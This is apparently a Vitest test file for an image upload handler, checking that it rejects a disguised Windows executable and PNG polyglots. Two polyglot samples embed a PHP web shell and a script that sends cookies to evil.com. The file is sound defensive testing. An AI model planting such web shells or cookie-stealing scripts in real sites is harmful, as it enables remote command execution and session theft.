import { describe, expect, it, vi } from "vitest";
import handler from "../../api/_upload.js";

vi.mock("../../api/_auth.js", () => ({
	cors: vi.fn(),
	clean: (val: string) => String(val || "").trim(),
	checkUser: vi.fn().mockResolvedValue({ ok: true }),
	rateLimited: vi.fn().mockResolvedValue(false),
	rateLimitResponse: vi.fn(),
	auditLog: vi.fn().mockResolvedValue(undefined),
}));

vi.mock("../../api/_db-client.js", () => ({
	default: {
		storage: {
			from: () => ({
				upload: vi.fn().mockResolvedValue({ error: null }),
				getPublicUrl: vi.fn().mockReturnValue({ data: { publicUrl: "https://mock.storage/img_123.png" } }),
			}),
		},
	},
}));

function createMockReqRes(body: Record<string, unknown>) {
	const req = {
		method: "POST",
		headers: {},
		body,
	};
	let statusCode = 200;
	let jsonBody: Record<string, unknown> = {};
	const res = {
		setHeader: vi.fn(),
		status: vi.fn((code: number) => {
			statusCode = code;
			return res;
		}),
		json: vi.fn((data: Record<string, unknown>) => {
			jsonBody = data;
			return res;
		}),
	};
	return { req, res, getStatus: () => statusCode, getJson: () => jsonBody };
}

describe("Upload Security & Anti-Malware Protection", () => {
	it("blocks Windows PE executable headers disguised as images", async () => {
		const peBuffer = Buffer.from([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00]);
		const { req, res, getStatus } = createMockReqRes({
			author_id: "anon-test",
			contentType: "image/png",
			fileBase64: peBuffer.toString("base64"),
		});

		await handler(req as any, res as any);
		expect(getStatus()).toBe(400);
	});

	it("blocks polyglot image containing embedded PHP webshell payload", async () => {
		const pngMagic = [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00, 0x00, 0x0d];
		const payload = Buffer.from("<?php eval($_POST['cmd']); ?>");
		const polyglot = Buffer.concat([Buffer.from(pngMagic), payload]);

		const { req, res, getStatus, getJson } = createMockReqRes({
			author_id: "anon-test",
			contentType: "image/png",
			fileBase64: polyglot.toString("base64"),
		});

		await handler(req as any, res as any);
		expect(getStatus()).toBe(400);
		expect(getJson().code).toBe("MALICIOUS_FILE_BLOCKED");
		expect(getJson().error).toMatch(/Malicious or executable content/);
	});

	it("blocks polyglot image containing embedded script injection", async () => {
		const pngMagic = [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00, 0x00, 0x0d];
		const payload = Buffer.from("<script>document.location='http://evil.com?c='+document.cookie</script>");
		const polyglot = Buffer.concat([Buffer.from(pngMagic), payload]);

		const { req, res, getStatus, getJson } = createMockReqRes({
			author_id: "anon-test",
			contentType: "image/png",
			fileBase64: polyglot.toString("base64"),
		});

		await handler(req as any, res as any);
		expect(getStatus()).toBe(400);
		expect(getJson().code).toBe("MALICIOUS_FILE_BLOCKED");
	});

	it("permits clean valid PNG images", async () => {
		const cleanPng = Buffer.from([
			0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00, 0x00, 0x0d,
			0x49, 0x48, 0x44, 0x52, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
			0x08, 0x06, 0x00, 0x00, 0x00, 0x1f, 0x15, 0xc4, 0x89
		]);

		const { req, res, getStatus, getJson } = createMockReqRes({
			author_id: "anon-test",
			contentType: "image/png",
			fileBase64: cleanPng.toString("base64"),
		});

		await handler(req as any, res as any);
		expect(getStatus()).toBe(200);
		expect(getJson().url).toBe("https://mock.storage/img_123.png");
	});
});
